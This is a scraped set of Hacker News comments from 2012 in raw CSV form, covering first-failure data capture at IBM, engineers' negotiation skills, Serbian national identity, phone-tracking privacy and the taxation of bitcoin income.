4837476,comment,4836924,4836924,10,0,jimwhitson,,,"At IBM, we were very keen on what we called 'FFDC' - 'first- failure data capture'. This meant having enough layers of error-detection, ideally all the way down to the metal, so that failures could be detected cleanly and logged before (possibly) going down, allowing our devs to reproduce and fix customer bugs. Naturally it wasn't perfect, and it depending on lots of very tedious planning meetings, but on the stuff I worked with (storage devices mainly) it was remarkably effective.<p>In my experience in more 'agile' firms - startups, web dev shops and so on - it would be very hard to make a scheme like this work well, because of all the grinding bureaucracy, fiddly spec-matching and endless manual testing required, as well as the importance of controlling - and deeply understanding - the whole stack. Nonetheless, for infrastructure projects like Redis, I can see value in having engineering effort put explicitly into making 'prettier crashes'.",1354031920

4837463,comment,4836834,4836834,13,0,michaelochurch,,,"I don't think it's just a problem for women. Most of us enter adulthood with <i>terrible</i> negotiation skills, especially in engineering. I certainly did. The percentage of people who are decent negotiators is small and, empirically, most of them seem to be men.<p>Successful people negotiate <i>everything</i>: job title, compensation, authority in hierarchical companies, project allocation. If turned down for a raise, they get a better project or a ""meaningless"" title that improves the CV. They're resilient against rejection (an inevitable outcome of negotiation) but they keep trying and working to improve. The rest, who don't, get mediocre results-- male or female. In software, there are a lot of people who don't know how to negotiate-- at all.<p>In school, we live in an artificial environment where everyone is assessed on similar projects and grades are fairly objective. So negotiating for a better result-- a B rather than a C-- is seen as dishonorable and weak. You should have studied harder. This no-negotiation zone is reasonable in a world where grades are (in comparison to workplace performance reviews) exceedingly fair and 90-95% get passing grades. If you're on the threshold (a 'D' student) it means you were a weak performer who managed to squeak by.<p>But in the real world, for promotions and favors and work autonomy and VC funding, pass rates are << 50% and if you don't have it in you to negotiate for a better outcome, you're screwed.",1354031820
4837462,comment,4834845,4836352,9,0,mladenkovacevic,,,"I've posted hundreds of comments here on HN but I believe this is the first time I have voluntarily proclaimed my ""Serb-ness"" so perhaps I am not the typical Serb that is always pointing out their nationality (and I only did it this time because it was the reason I know about Mileva Maric). But I have a few theories as to why you may think we are always pointing our nationality or at least seem to:<p>1) It is a immigrant thing. When you feel that you are being identified as the ""other"" you get the urge to preemptively ""come out of the closet"" as an immigrant in a show of good will towards your native hosts and try to fit in. It's a way of saying ""Hey guys, I know I am this scary foreigner, but really I'm just like you so can we be friends?"" I've experienced this with people of many other nationalities and ethnicities where the conversation will inevitably turn into them telling me about their country of origin.. which I don't mind since I enjoy learning about different cultures.<p>2) Maybe you encounter a disproportionate number of Serbian people in your daily life so point #1 is magnified, or perhaps because of your own background or personal reasons you are overly sensitive to the idea of Serbian identity.<p>3) Serbs do tend to be sensitive about their ethnic identity because many of us feel that we have been misrepresented and not entirely fairly villainized in the media, while at the same time also being victims of long standing ethnic hatred in our native countries, so insecurity borne out of that treatment motivates an exaggerated sense of nationalism in some of us.<p>Hopefully one of those, or a combination of them, explains why ""Serbs are always pointing out their nationality"".",1354031812

I'd rather not give up my privacy to combat what are essentially black swan events.<p>With my base opinion out of the way, I will say I would be comfortable with the kind of tracking you mentioned if there were strong protections on what the police could do with that data. For instance, the phone's owner should be protected from prosecution in similar ways to evidence gained from an illegal search. This data should also have a maximum lifetime. Finally, it should be clear when the records are being requested so the owner of the number can turn it off if they move the number to a new phone.<p>Unfortunately, I can't imagine these kinds of laws being passed, so, until they do, I'll stick with my default of believing the government should require more effort, not less, to snoop in my life.",1354031730

I suppose you might even be subject to capital gains tax if the value of your bitcoins goes up (although I'm not sure if capital gains has even been tested for digital currency, gains in foreign currency values are taxed).<p>The only way bitcoins can enable you to not pay tax is through lying to the IRS (i.e. tax evasion, which is illegal). And, given that anonymity with bitcoins is harder than it seems, there's a good chance that you will eventually be caught if bitcoins become popular, even if the IRS is not aggressively looking at bitcoin transactions currently.<p>If you suddenly start making all of your income in bitcoins and don't report it to the IRS, the IRS may very well audit you, wondering how you are supporting your lifestyle without any income.",1354031424
